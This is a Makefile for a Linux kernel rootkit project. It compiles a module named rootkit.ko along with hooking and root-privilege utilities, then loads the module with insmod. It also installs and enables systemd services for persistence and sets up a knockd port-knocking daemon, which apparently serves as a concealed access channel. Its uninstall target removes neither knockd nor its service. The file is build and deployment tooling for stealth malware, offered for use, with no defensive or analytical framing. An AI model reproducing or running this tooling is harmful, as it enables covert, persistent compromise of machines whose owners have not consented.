obj-m := rootkit.o
rootkit-objs := src/module/rootkit.o src/utils/hook.o src/utils/root.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(abspath $(PWD))
BIN_DIR := $(PWD)/bin
TMP_DIR := $(PWD)/tmp
SRC_DIR_UTILS := $(PWD)/src/utils
EXTRA_CFLAGS := -I$(PWD)/include

CC = gcc
CFLAGS = -Wall -Wextra -std=c99 -I$(PWD)/include
SRC = src/main.c src/utils/logger.o src/utils/personality.o
INC = -I$(PROJECT_DIR)/include
OUT = bin/personality


all: rootkit personality install

rootkit:
	make -C $(KDIR) M=$(PWD) modules
	@mv rootkit.ko $(BIN_DIR)/
	@mv *.o *.mod *.mod.c .*.cmd *.symvers *.order $(TMP_DIR)/

personality: $(SRC)
	$(CC) $(CFLAGS) $(SRC) -o $(OUT)

install:
	sudo insmod bin/rootkit.ko
	sudo cp src/script/personality_install.sh /usr/local/bin/personality_install.sh
	sudo chmod +x /usr/local/bin/personality_install.sh
	sudo cp src/script/personality.service /etc/systemd/system/personality.service
	sudo systemctl enable personality.service
	sudo cp ../knockd /usr/local/bin/knockd
	sudo cp src/script/knockd.service /etc/systemd/system/knockd.service
	sudo cp src/script/knockd.conf /etc/knockd.conf
	sudo systemctl enable knockd.service

uninstall:
	sudo rmmod rootkit
	@rm -f /usr/local/bin/personality_install.sh /etc/systemd/system/personality.service

clean:
	make -C $(KDIR) M=$(PWD) clean
	@rm -rf $(TMP_DIR)/* $(BIN_DIR)/*
	@rm -f $(BIN_DIR)/rootkit.ko $(BIN_DIR)/compagnon